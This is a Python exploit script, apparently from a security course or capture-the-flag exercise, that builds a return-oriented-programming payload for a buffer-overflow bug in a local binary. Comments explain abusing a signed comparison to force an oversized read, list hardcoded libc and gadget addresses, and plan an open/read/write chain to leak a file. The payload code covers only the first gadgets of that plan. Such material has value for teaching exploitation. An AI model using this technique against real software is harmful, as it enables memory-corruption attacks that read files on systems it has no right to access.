#!/usr/bin/python3

# i and fsize are compared on line 21
# the cmp instruction on x86 subtracts
# what happens in assembly is fsize - i
# to create a buffer overflow must set read_size = fsize
# for this need to cause the subtraction to set either ZERO or CARRY flag
# i must be up to 24 so let's say we make it a negative number
# then read_size = fsize so any file will be completely read


def pack64(n):
	s = ""
	while n:
		s += chr(n % 0x100)
		n = n // 0x100
	s = s.ljust(8, "\x00")
	return s.encode()


"""
Useful addresses:
    * open function in libc: 0x7ffff7b04030
    * read function in libc: 0x7ffff7b04250
    * write function in libc:  0x7ffff7b042b0
    * writable memory in libc area that we do not need otherwise:
      0x00007ffff7dd1000 to 0x00007ffff7dd7000
      24576 bytes (identified with vmmap)
      with address randomization this may change slightly but let's see...
    
Arguments to function:
    * read need the file descriptor returned by open. Since 0, 1, 2 are
      stdin, stdout and stderr, and 3 should be from the exploit file, the value
      return by open for the file we choose should be 4 (file descriptors are
      allocated in sequence)
    * the buffer can be any writable memory location that we don't need 
      otherwise, so we can use the identified segment of libc
    * the number of bytes can be as much space as we have in the buffer: 24576

How to pass the arguments:
    * in 64 bit System V AMD64 ABI arguments to fucntions are passed the first 5
    in rdi, rsi, rdx, rcx, r8, r9
    * we need only rdi, rsi, rdx as our function calls only take 2 or 3 args
    
    
open(filename, 0):
    rdi = &filename
    rsi = 0
    return address overwritten to libc open
    
read(4, buffer, 24576)
    rdi = 4
    rsi = &buffer
    rdx = 24576
    return address overwritten to libc read

write(1, buffer, 24576)
    rdi = 1
    rsi = &buffer
    rdx = 24576
    return address overwritten to libc write
    
Gadgets:

0x004008c3 : (5fc3)	pop    rdi;	ret
0x004008c1 : (5e415fc3)	pop    rsi;	pop    r15;	ret

0x00000000004006b0 <deregister_tm_clones+48>:	pop    rbp
0x00000000004006b1 <deregister_tm_clones+49>:	ret



"""

FILENAME = b"./hello.txt"

EXPLOIT = FILENAME + b"\x00" # null termination
align = len(EXPLOIT) % 8
EXPLOIT += (8 - align) * b"A" # realign bytes

EXPLOIT += 24 * b"A"
EXPLOIT += 0x4008c1.to_bytes(8, 'little')

EXPLOIT += 0x7fffffffddf0.to_bytes(8, 'little')

EXPLOIT += 0x4008c3.to_bytes(8, 'little')

with open("exploit", "wb") as f:
    f.write(EXPLOIT)
